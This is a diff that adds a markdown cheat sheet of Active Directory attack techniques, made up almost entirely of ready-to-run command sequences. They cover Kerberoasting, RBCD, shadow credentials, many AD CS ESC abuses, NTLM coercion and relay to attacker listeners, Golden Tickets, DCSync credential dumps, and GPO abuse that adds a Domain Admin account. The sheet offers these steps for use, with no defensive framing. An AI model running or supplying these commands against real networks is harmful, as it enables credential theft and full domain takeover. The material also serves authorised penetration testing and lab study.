@@ -1,0 +1,327 @@
+# Active Directory
+
+Collection → graph analysis → ACL abuse, the standard AD escalation loop once you have one domain credential.
+
+```bash
+nxc smb <DC_IP> -u <USER> -p '<PASS>'
+nxc smb <DC_IP> -u <USER> -p '<PASS>' --generate-hosts-file hosts
+# /etc/hosts: <DC_IP>  <DC_FQDN> <domain> <DC_SHORTNAME>
+
+bloodhound-ce.py -u '<USER>' -p '<PASS>' -d <domain> -dc <DC_FQDN> -ns <DC_IP> -c All --zip
+
+# if BloodHound shows you have AddMember on a privileged-nested group:
+bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' add groupMember '<GROUP>' <USER>
+
+nxc smb <DC_IP> -u <USER> -p '<PASS>'        # re-check — should now show Pwn3d / admin
+evil-winrm -i <DC_FQDN> -u <USER> -p '<PASS>'
+```
+
+RBCD via a self-created machine account (works if `MachineAccountQuota` lets you create one):
+
+```bash
+addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass '<PW>' \
+  -dc-host <DC_SHORTNAME> -domain-netbios <domain> '<domain>/<USER>:<PASS>'
+
+rbcd.py -dc-ip <DC_IP> -delegate-from 'ATTACKERSYSTEM$' \
+  -delegate-to '<DC_SHORTNAME>$' -action 'write' '<domain>/<USER>:<PASS>'
+
+getST.py -spn 'cifs/<DC_FQDN>' -impersonate 'Administrator' \
+  '<domain>/ATTACKERSYSTEM$:<PW>'
+
+export KRB5CCNAME=Administrator@cifs_<DC_FQDN>@<REALM>.ccache
+smbexec.py -k -no-pass <domain>/Administrator@<DC_FQDN>
+secretsdump.py -k -no-pass <domain>/Administrator@<DC_FQDN>   # full NTDS dump
+```
+
+RBCD also works through an ACL you already hold (`GenericWrite`/`GenericAll` on a computer object) — skip the machine-account creation step and go straight to `rbcd.py ... -delegate-from <existing-account> -action write`.
+
+Kerberoasting / AS-REP roasting / RID cycling (no special rights needed to start):
+
+```bash
+nxc smb <DC_IP> -u guest -p '' --rid                              # RID cycling via null/guest session -> usernames
+nxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt         # accounts with "no preauth required"
+hashcat -a0 -m18200 asrep.txt <WORDLIST>
+
+nxc ldap <DC_IP> -u guest -p '' --kerberoasting kerb.txt           # kerberoastable SPNs, even unauthenticated
+hashcat -a0 -m13100 kerb.txt <WORDLIST>
+
+# targeted kerberoast: if you have GenericWrite on a user with no SPN, give them one and roast just them
+targetedKerberoast.py -d <domain> -u <USER> -p '<PASS>' --request-user <TARGET_USER> --dc-ip <DC_IP>
+hashcat -a0 -m13100 <target>.blob <WORDLIST>
+```
+
+NTLM coercion from a writable share (when direct cred access stalls): drop a file containing a UNC path (e.g. inside a script a scheduled job will open) pointing at a rogue SMB listener, capture the resulting NTLMv2 hash, then crack it:
+
+```bash
+smbserver.py -smb2support <share-name> <local-dir>   # or Responder/ntlmrelayx, depending on setup
+# planted file references: \\<LHOST>\<share-name>\whatever
+hashcat -a0 -m5600 hash.txt <WORDLIST>
+```
+
+AD CS ESC1 (misconfigured template lets you request a cert for an arbitrary UPN):
+```bash
+certipy-ad find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -vulnerable
+certipy-ad req -username <USER> -password '<PASS>' -ca <CA_NAME> -target <DC_FQDN> \
+  -template <vulnerable-template> -upn <target-privileged-user>@<domain> -dns <DC_IP>
+certipy-ad auth -pfx <issued>.pfx -dc-ip <DC_IP>        # returns the target's NT hash
+```
+ESC4: if you only have *write* access to the template object (not an already-vulnerable one), set the flags yourself first, then it's ESC1 from there:
+```bash
+# via PowerView-style AD object editing:
+Set-DomainObject -XOR @{'mspki-enrollment-flag'=2}       # ENROLLEE_SUPPLIES_SUBJECT
+Set-DomainObject -Set @{'mspki-certificate-name-flag'=1}
+Set-DomainObject -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'}  # Client Auth EKU
+```
+
+RBCD empty-hash workaround when the acting account has no usable password (e.g. guest):
+```bash
+rbcd.py <domain>/guest -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
+  -dc-ip <DC_IP> -delegate-to <DC>$ -delegate-from <attacker-machine>$ -action write
+```
+
+Golden Ticket across a parent/child domain trust — inject an extra SID to get Enterprise Admins instead of just child-domain rights (after DCSync'ing the child's krbtgt):
+```bash
+ticketer.py -nthash <krbtgt-hash> -domain <child.domain> -domain-sid <child-SID> \
+  -extra-sid <parent-domain-SID>-519 Administrator   # 519 = Enterprise Admins RID
+```
+
+Shadow Credentials — if you have `GenericWrite` on a user/computer object, add an attacker-controlled key credential instead of resetting their password (quieter, doesn't break their existing access):
+```bash
+python pywhisker.py -d <domain> -u <USER> -p '<PASS>' --target <TARGET> --action add   # writes msDS-KeyCredentialLink, outputs a PFX
+gettgtpkinit.py -cert-pfx <issued>.pfx -pfx-pass <pfx-password> <domain>/<TARGET> <target>.ccache
+export KRB5CCNAME=<target>.ccache
+getnthash.py -key <session-key-from-pkinit-output> <domain>/<TARGET>   # recover their NT hash via U2U
+```
+
+ESC13 (issuance policy OID linked to a privileged group) — certipy flags it directly; just request the template:
+```bash
+certipy find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -vulnerable
+certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <template> -key-size 4096   # bump key size if the default is rejected
+certipy auth -pfx <issued>.pfx -dc-ip <DC_IP>
+```
+
+ESC3 (template has the Certificate Request Agent EKU) — lets you enroll an agent cert, then use it to request a cert *on behalf of* anyone else:
+```bash
+certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <enrollment-agent-template>
+certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template User \
+  -on-behalf-of '<DOMAIN>\Administrator' -pfx <agent-cert>.pfx
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+ESC7 (you hold Manage CA / Manage Certificates rights on the CA itself) — approve your own pending request after enabling a privileged template:
+```bash
+certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -add-officer <USER>
+certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -enable-template SubCA
+certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -target <DC_FQDN> -template SubCA \
+  -upn 'administrator@<domain>' -sid '<domain-SID>-500'                 # returns a pending request ID
+certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -issue-request '<request-ID>'
+certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -target <DC_FQDN> -retrieve '<request-ID>'
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+ESC8 (AD CS Web Enrollment reachable over HTTP, no Extended Protection for Authentication) — relay any coerced machine-account auth into a cert request, no template misconfig needed:
+```bash
+certipy find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -scheme ldap -vulnerable   # look for "ESC8": "Web Enrollment is enabled..."
+certipy relay -target 'http://<CA_HOST>' -template DomainController &
+petitpotam.py -u <USER> -p '<PASS>' <LISTENER_IP> <DC_IP>          # coerces the DC machine account to auth to your relay
+certipy auth -pfx <dc-host>.pfx -dc-ip <DC_IP>                     # -> DC$ machine account NT hash
+secretsdump.py '<domain>/<dc-host>$'@<DC_FQDN> -hashes :<HASH>     # DCSync
+```
+
+ESC9 (no security extension on the cert template) — combine with a GenericWrite you hold over some other enrolling account: temporarily change that account's UPN to the target, request a cert, then restore the UPN. The resulting cert has no `szOID_NTDS_CA_SECURITY_EXT`, so the KDC maps it purely by UPN at auth time:
+```bash
+certipy find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -vulnerable       # look for "ESC9": "... template has no security extension"
+certipy account update -u <USER>@<domain> -p '<PASS>' -user <enrolling-account> -upn Administrator
+certipy req -u <enrolling-account>@<domain> -p '<its-pass>' -ca <CA_NAME> -template <vulnerable-template>   # -> administrator.pfx
+certipy account update -u <USER>@<domain> -p '<PASS>' -user <enrolling-account> -upn <enrolling-account>@<domain>   # restore UPN after
+certipy auth -pfx administrator.pfx -domain <domain>
+```
+
+Backup Operators group membership — this group can remotely dump SAM/SYSTEM registry hives without ever getting an interactive session:
+```bash
+nxc smb <target> -u <USER> -H '<hash>' -M backup_operator    # drives the remote backup+download for you
+# or manually:
+reg.py '<domain>/<USER>'@<target> -hashes ':<hash>' backup -o '\\<attacker-share>'
+secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
+```
+
+LAPS v2 (DPAPI-NG encrypted blobs) — the plaintext local-admin password is now wrapped in DPAPI-NG, not AES; strip the 16-byte header, then let the DC unwrap it over Kerberos (requires read rights on `msLAPS-EncryptedPassword`, granted to whatever principal the LAPS policy names):
+```bash
+bloodyAD -d <domain> -u <USER> -k --host <DC_FQDN> msldap laps      # dumps raw blobs (current + password history)
+```
+```python
+import dpapi_ng
+data = raw_blob[16:]   # strip the KDSK header
+dpapi_ng.ncrypt_unprotect_secret(data, server="<DC_FQDN>", auth_protocol="kerberos").decode("utf-16-le")
+```
+
+Deleted-object (tombstone) restore via a `restore` right — if an ACL abuse chain gives you write access to a deleted account's tombstone, restoring it resurrects the account with its original group memberships/ACLs intact, which can reopen an otherwise-closed privilege path:
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' set restore '<deleted-sAMAccountName>' --newParent '<target-OU-DN>'
+```
+
+Targeted Kerberoast against an AES-only account (`msDS-SupportedEncryptionTypes` excludes RC4) — Impacket's `GetUserSPNs.py` requests RC4 by default and gets rejected; patch it to request AES instead:
+```bash
+sed -i 's/int(constants.EncryptionTypes.rc4_hmac.value)/int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)/g' \
+  $(python3 -c "import impacket,os;print(os.path.dirname(impacket.__file__))")/krb5/kerberosv5.py
+GetUserSPNs.py -dc-host <DC_FQDN> -request -k -no-pass '<domain>/<USER>$'   # -> $krb5tgs$18$... (etype 18 = AES256)
+hashcat -m19700 -a0 hash.txt <WORDLIST>
+```
+
+Stolen CA attack — if you land local admin on the CA server itself (not just a vulnerable template), export the CA's private key and forge a certificate for any user offline, no enrollment needed at all:
+```bash
+certipy ca -backup -ca '<CA_NAME>' -username '<USER>@<domain>' -password '<PASS>' -dc-ip <DC_IP> -target <CA_HOST>
+certipy forge -ca-pfx '<CA_NAME>.pfx' -upn '<target-user>@<domain>' -subject 'CN=<target-user>,CN=Users,DC=<DC1>,DC=<DC2>' \
+  -sid '<target-user-SID>' -crl 'ldap:///'   # -crl is required if PKINIT auth fails revocation-check without it
+certipy auth -pfx '<target-user>_forged.pfx' -dc-ip <DC_IP> -username '<target-user>' -domain <domain>
+```
+
+DCC2 (domain cached credentials) cracking — once you have local admin on any domain-joined box, `secretsdump`'s LSA dump often includes a cached logon hash for a domain user who's RDP'd/logged in there before, even a Domain Admin:
+```bash
+secretsdump.py -hashes ':<local-admin-hash>' '<domain>/Administrator@<HOST>' -local-auth   # look for the DCC2 blob in the output
+hashcat -m2100 dcc2_hash.txt <WORDLIST>
+```
+
+CVE-2025-24054 (.library-ms NTLM coercion) — planting a crafted `.library-ms` file on any writable share coerces NTLM auth from whoever's machine renders it in Explorer, same outcome as the classic .lnk/SCF coercion but via a newer file type:
+```bash
+python exploit.py --server <LHOST> --filename '<name>'    # public PoC, builds <name>.library-ms with <url>\\<LHOST>\share</url>
+smbclient.py <user>@<target>   # put the generated file onto any writable share
+sudo responder -I <iface>
+hashcat -a0 -m5600 captured.NTLMv2-SSP <WORDLIST>
+```
+
+BadSuccessor (Windows Server 2025 delegated Managed Service Accounts) — if you have Create-Child rights on *any* OU and GenericAll over the dMSA you create there, you can link it to any existing user and get the KDC to issue you a ticket carrying that user's full PAC, no password reset or ACL abuse on the target needed:
+```powershell
+New-ADComputer -Name <attacker-computer> -SamAccountName '<attacker-computer>$' -AccountPassword (ConvertTo-SecureString '<PW>' -AsPlainText -Force) -Enabled $true -Path '<writable-OU-DN>'
+New-ADServiceAccount -Name <dmsa-name> -DNSHostName '<dmsa-name>.<domain>' -CreateDelegatedServiceAccount -KerberosEncryptionType AES256 \
+  -PrincipalsAllowedToRetrieveManagedPassword '<attacker-computer>$' -Path '<writable-OU-DN>'
+# grant yourself GenericAll on the dMSA object (via Set-Acl or an ACL tool), then link it to the target to impersonate:
+Set-ADServiceAccount -Identity <dmsa-name> -Replace @{
+  'msDS-ManagedAccountPrecededByLink' = '<target-user-DN>'
+  'msDS-DelegatedMSAState' = 2
+}
+```
+```bash
+# get a TGT for your attacker computer account, then ask for a TGS for the dMSA (Rubeus does the dMSA-aware request)
+Rubeus.exe asktgs /targetuser:<dmsa-name>$ /service:krbtgt/<domain> /dmsa /opsec /ptt /outfile:ticket.kirbi /ticket:<computer-tgt>
+ticketConverter.py ticket.kirbi <dmsa>.ccache
+export KRB5CCNAME=<dmsa>.ccache
+secretsdump.py -k -no-pass <DC_FQDN>     # ticket now carries the linked target user's rights
+```
+Confirm exposure first with NetExec's `badsuccessor` module (`nxc ldap <DC> -u <USER> -p <PASS> -M badsuccessor`).
+
+GPO abuse via GenericWrite — add a scheduled-task/immediate-task to a GPO you can write, which runs as any account logging in under it (fast path to Domain Admins if the GPO links to a privileged OU):
+```bash
+pygpoabuse.py '<domain>/<USER>' -hashes :'<HASH>' -gpo-id '<GPO-GUID>' \
+  -command 'net user <u> <p> /add && net group "Domain Admins" <u> /add' -f
+```
+
+Readable Kerberos keytab — a leftover `/etc/krb5.keytab` on a Linux box joined to AD gives a direct TGT for whatever principal it holds, no password needed:
+```bash
+klist -k -t -K /etc/krb5.keytab          # confirms the principal name
+kinit -kt /etc/krb5.keytab '<Principal>@<REALM>'
+export KRB5CCNAME=/tmp/krb5cc_0
+nxc ldap <DC_FQDN> -u <principal> -k --use-kcache
+```
+If `root` owns the keytab and you can't read it directly but you're in the `disk` group (raw block device read — see the Linux privesc note), pull it straight off the filesystem via `debugfs` instead. Either way, you can also extract the principal's NTLM hash straight from the keytab for pass-the-hash elsewhere, without needing a TGT at all:
+```bash
+./keytabextract.py /path/to/krb5.keytab    # https://github.com/sosdave/KeyTabExtract — prints the NT hash per principal
+```
+
+Timeroasting — computer accounts can be hashed via unauthenticated SNTP (MS-SNTP), no creds needed at all; useful recon/cred-crack path on a DC with lots of machine accounts:
+```bash
+nxc smb <DC_IP> -M timeroast                 # dumps RID:hash pairs
+hashcat --username -a0 -m31300 hashes.txt <WORDLIST>   # mode needs a recent hashcat (7.x); older builds lack it
+```
+
+Object relocation across OUs — if you can write `distinguishedName` on an object, moving it into a more permissive OU makes it inherit that OU's ACL (useful when one tier/OU has a stray `GenericAll`+inherit ACE the others don't, or to pull a "quarantined" account out of an isolated OU):
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -k set object '<CN=target,OU=restrictive-OU,...>' distinguishedName -v '<CN=target,OU=permissive-OU,...>'
+bloodyAD --host <DC_FQDN> -d <domain> -k set password <target> '<newpass>'   # now inherited GenericAll lets this through
+```
+Same move via raw LDAP (works when bloodyAD's syntax doesn't fit, or you only have `ldapmodify`):
+```ldif
+dn: CN=<target>,OU=<source-OU>,DC=<dc1>,DC=<dc2>
+changetype: moddn
+newrdn: CN=<target>
+deleteoldrdn: 1
+newsuperior: OU=<dest-OU>,DC=<dc1>,DC=<dc2>
+```
+```bash
+ldapmodify -H ldap://<DC_FQDN> -D '<USER>@<domain>' -w '<PASS>' -f move.ldif
+```
+
+Kerberoast encryption downgrade — if `targetedKerberoast` only returns an AES ticket (etype 18, uncrackable without the plaintext), and you hold write on the target's `msDS-SupportedEncryptionTypes`, force RC4 instead of patching Impacket:
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -k set object <TARGET_USER> msDS-SupportedEncryptionTypes -v 4   # 4 = RC4 only
+targetedKerberoast.py -k --dc-host <DC_FQDN> -d <domain> -u <USER> --request-user <TARGET_USER>   # now $krb5tgs$23$ (RC4)
+hashcat -m13100 -a0 hash.txt <WORDLIST>
+```
+
+Constrained delegation with protocol transition abuse — if you can set `msDS-AllowedToDelegateTo` and the `TRUSTED_TO_AUTH_FOR_DELEGATION` UAC flag on an account you control (e.g. via prior `GenericAll`/`GenericWrite`), it can request a ticket to any service *as anyone*, including Administrator (S4U2Self + S4U2Proxy, no target password needed):
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -k set object '<CONTROLLED_ACCT>' msDS-AllowedToDelegateTo -v '<spn, e.g. ldap/DC_FQDN>'
+bloodyAD --host <DC_FQDN> -d <domain> -k add uac '<CONTROLLED_ACCT>' -f TRUSTED_TO_AUTH_FOR_DELEGATION
+getTGT.py '<domain>/<CONTROLLED_ACCT>:<PASS>'
+export KRB5CCNAME=<CONTROLLED_ACCT>.ccache
+getST.py '<domain>/<CONTROLLED_ACCT>' -spn <same-spn> -impersonate Administrator -k -no-pass -dc-ip <DC_IP>
+export KRB5CCNAME=Administrator@<spn-with-underscores>@<REALM>.ccache
+secretsdump.py -k -no-pass <DC_FQDN>                 # DCSync as impersonated Administrator
+```
+
+gMSA password read — if a principal is listed in the gMSA's `msDS-GroupMSAMembership` DACL, they can retrieve its managed password:
+```bash
+nxc ldap <DC_IP> -u <USER> -p '<PASS>' --gmsa           # -> NT hash of <gMSA_account>$
+nxc smb <target> -u '<gMSA_account>$' -H '<NT_hash>' --sam   # use hash for lateral movement / SAM dump
+```
+
+SPN-jacking / S4U2Proxy retarget — after you obtain a service ticket for one SPN, use `-altservice` to redirect it to a different SPN at auth time (works when unconstrained-delegation coercion gives you a TGS for `cifs/X` but you need `http/X`):
+```bash
+getST.py '<domain>/<account>' -spn 'cifs/<TARGET>' -altservice 'http/<TARGET>' -impersonate Administrator
+```
+
+logonHours restriction bypass — a "STATUS_ACCOUNT_RESTRICTION" error on valid creds may mean the account has `logonHours` set. Clear the attribute to remove the time restriction:
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' set attr <RESTRICTED_USER> logonHours -v ''
+```
+
+bloodyAD writable object enumeration — enumerate every AD object the current principal can write (useful for discovering ACL abuse paths that BloodHound may not surface for non-standard attribute writes):
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' get writable
+```
+
+NTLM reflection CVE-2025-33073 (Windows Server 2025, DNS Operators group) — DNS Operators can create DNS A records pointing to an attacker IP. Combine with PetitPotam/coerce to force the machine account to authenticate to that address; relay the NTLMv2 via ntlmrelayx to LDAP to escalate:
+```bash
+# requires DNS Operators membership
+dnstool.py -u '<domain>/<USER>' -p '<PASS>' -r '<attacker-hostname>' -d <LHOST> --action add -t A <DC_IP>
+ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <USER>   # relay NTLM to LDAP to grant DCSync rights
+petitpotam.py -u <USER> -p '<PASS>' <LHOST> <DC_IP>       # coerce DC auth to attacker-controlled record
+secretsdump.py '<domain>/<USER>'@<DC_IP>                   # DCSync after privilege escalation
+```
+
+
+DNS CREATE_CHILD rights on AD-integrated zone — if you have Create-Child on a DNS zone object (separate from DNS Operators), use `dnstool.py` to add A records and redirect authentication for targeted hosts:
+```bash
+# Check CREATE_CHILD on DNS zone:
+bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' get writable | grep DNS
+dnstool.py -u '<domain>/<USER>' -p '<PASS>' -dc-ip <DC_IP> \
+  -r '<hostname>' -d <LHOST> --action add -t A
+# Now coerce the target host to authenticate via the hijacked record
+petitpotam.py -u <USER> -p '<PASS>' <LHOST> <TARGET>
+```
+
+ESC17 (WSUS enrollment certificate) — if you can enroll for a certificate with the WSUS server name in the Subject (a misconfigured template with Client Auth EKU and no SAN restriction), forge a certificate for a decommissioned WSUS host, add a DNS record pointing to your box, stand up a rogue WSUS server that pushes a malicious update:
+```bash
+certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -template <ESC17-template> \
+  -subject 'CN=<WSUS_FQDN>'
+# set up WSUS server (e.g. via SharpWSUS or PsExec equivalent), point via DNS record
+dnstool.py ... -r '<wsus-hostname>' -d <LHOST> --action add
+# deliver malicious update that adds low-priv user to Administrators
+```
+
+Recover `SeImpersonatePrivilege` from the original logon token — when you have code exec as a service account that was granted SeImpersonate at logon but a `CreateProcessWithTokenW` call stripped it, recover the original token via named pipe:
+```bash
+# Upload and run RunasCs to create a process with the original token:
+RunasCs.exe <user> <pass> "cmd.exe /c <payload>" --force-profile --logon-type 9
+# or: use the named pipe technique to get the original high-privilege token before it's stripped
+```
